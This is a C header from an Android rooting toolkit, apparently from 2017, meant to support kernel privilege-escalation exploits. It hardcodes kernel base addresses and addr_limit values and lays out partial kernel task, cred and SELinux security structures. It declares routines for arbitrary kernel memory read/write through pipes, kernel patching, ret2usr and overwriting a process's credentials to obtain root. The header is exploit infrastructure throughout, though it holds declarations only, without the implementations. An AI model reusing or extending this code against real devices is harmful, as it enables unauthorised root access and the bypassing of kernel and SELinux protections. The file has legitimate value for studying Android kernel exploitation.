/*
 * android roothelper, is lazy and powerfull.
 *
 * Copyright (C) 2017 by idhyt3r@gmail.com
 *
 */

#ifndef __ROOTHELPER_H
#define __ROOTHELPER_H

#include "param.h"

// #define PRINT
#ifdef PRINT
#define LOGVV(...)       \
  {                      \
    printf(__VA_ARGS__); \
    fflush(stdout);      \
  }
#else
#define LOGVV(...)
#endif

/*
  CONFIG_SMP: support ARMv7-A +
  sched_fork(){}
  #define INIT_TASK(tsk)
*/
#define pushable_tasks_prio 0x8c

#ifdef __LP64__
  #define KERNEL_START 0xffffff8000000000
  #define KERNEL_BASE 0xffffffc000080000
  #define SECURITY_LIMIT 0xffffffffffff0000
  #define def_task_struct_tasks_offset 0x290
  #define CHECK_TASK_PAR_SIZE 0x800
  #define THREAD_SIZE 0x4000

  struct thread_info {
    unsigned long flags;
    unsigned long addr_limit;
    struct task_struct *task;
  };

#else

  #define KERNEL_START 0xc0000000
  #define KERNEL_BASE 0xc0008000
  #define SECURITY_LIMIT 0xffffff00
  #define def_task_struct_tasks_offset 0x1d0
  #define CHECK_TASK_PAR_SIZE 0x600
  #define THREAD_SIZE 0x2000    // unwind_frame 0xFFFFE000 = ~(0x2000-1)

  struct thread_info {
    unsigned long flags;
    int preempt_count;
    unsigned long addr_limit;
    struct task_struct *task;
  };

#endif

#define BYTE_SIZE sizeof(unsigned long)

#define ARRAY_SIZE(a) (sizeof(a) / sizeof(*(a)))

#define is_kptr(p) ((unsigned long)(p) >= KERNEL_START)

#define CPU_CUR_ONLINE sysconf(_SC_NPROCESSORS_ONLN)

#define CPU_CUR_NUMS sysconf(_SC_NPROCESSORS_CONF)

#define INIT_TASK_COMM "init"

#define SECINITSID_KERNEL 1    // u:r:kernel:s0

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct task_struct_partial {
  struct list_head cpu_timers[3];
  struct cred *real_cred;
  struct cred *cred;
#ifndef __LP64__
  // struct cred *replacement_session_keyring;
#endif
  char comm[16];
};

struct kernel_cap_struct {
  unsigned int cap[2];
};

struct task_security_struct {
  unsigned int osid;
  unsigned int sid;
  unsigned int exec_sid;
  unsigned int create_sid;
  unsigned int keycreate_sid;
  unsigned int sockcreate_sid;
};

struct cred {
  int usage;
  uid_t uid;
  gid_t gid;
  uid_t suid;
  gid_t sgid;
  uid_t euid;
  gid_t egid;
  uid_t fsuid;
  gid_t fsgid;
  unsigned securebits;
  struct kernel_cap_struct cap_inheritable;
  struct kernel_cap_struct cap_permitted;
  struct kernel_cap_struct cap_effective;
  struct kernel_cap_struct cap_bset;
  /*
      unsigned char jit_keyring;
      void *session_keyring;
      void *process_keyring;
      void *thread_keyring;
      void *request_key_auth;
  */
  struct task_security_struct *security;
  /*
      struct user_struct *user;
      void *user_ns;
      void *group_info;
      unsigned long rcu[2];
      void *use_cnt;
      struct task_struct *bp_task;
      void *bp_pgd;
      unsigned long long type;
  */
  /* ... */
  unsigned long dummy[40];
};

struct cred_partial {
  uid_t uid;
  gid_t gid;
  uid_t suid;
  gid_t sgid;
  uid_t euid;
  gid_t egid;
  uid_t fsuid;
  gid_t fsgid;
  unsigned securebits;
  struct kernel_cap_struct cap_inheritable;
  struct kernel_cap_struct cap_permitted;
  struct kernel_cap_struct cap_effective;
  struct kernel_cap_struct cap_bset;
  /*
      unsigned char jit_keyring;
      void *session_keyring;
      void *process_keyring;
      void *thread_keyring;
      void *request_key_auth;
  */
  struct task_security_struct *security;
  /*
      struct user_struct *user;
      void *user_ns;
      void *group_info;
      unsigned long rcu[2];
      void *use_cnt;
      struct task_struct *bp_task;
      void *bp_pgd;
      unsigned long long type;
  */
  /* ... */
  unsigned long dummy[40];
};

struct cred_struct_partner {
  int uid_offset;       // cred->uid
  int security_offset;  // cred->security
  struct task_security_struct security;
};

struct task_struct_partner {
  char task_name[0x20];
  unsigned long task_struct_addr;
  // int tasks_to_comm_offset;     // task->comm - task->tasks
  int comm_offset;              // task->comm
  int cred_offset;              // task->cred
  int tasks_offset;             // task->tasks
  struct cred_struct_partner credp;
};

ssize_t pipe_read_memory(const void *src, void *dest, size_t count);

ssize_t pipe_write_memory(void *dest, const void *src, size_t count);

void patch_memory(char is_patch, struct patch_gadget patch[]);

int check_arbitrary_rwcap(unsigned long check_addr);

int obtain_root_by_task_name(unsigned long init_task_addr, char *task_name,
                             int task_security_offset, int task_cred_uid_offset);

int obtain_root_by_arbitrary_rwcap(
  unsigned long init_task_addr, 
  int task_security_offset, 
  int task_cred_uid_offset,
  char is_patch);

struct thread_info* obtain_arbitrary_rwcap_by_ret2usr();

int obtain_root_by_ret2usr(int task_security_offset, int task_cred_uid_offset, int init_sid);

void set_task_name(char *name);

void set_random_task_name(int len, char *name);

void set_bind_cpu_id();

int bind_process_on_cpu(int cpuid);

int bind_thread_on_cpu(int cpuid);

void printf_kernel_buffer(unsigned long addr, int len);

int call_ptmx_fops_check_flags(char * arg);

int show_task_info_by_arbitrary_rwcap(unsigned long task_struct, int task_security_offset, int task_cred_uid_offset);

int show_thread_info_by_arbitrary_rwcap(unsigned long th_sp, int task_security_offset, int task_cred_uid_offset);

#endif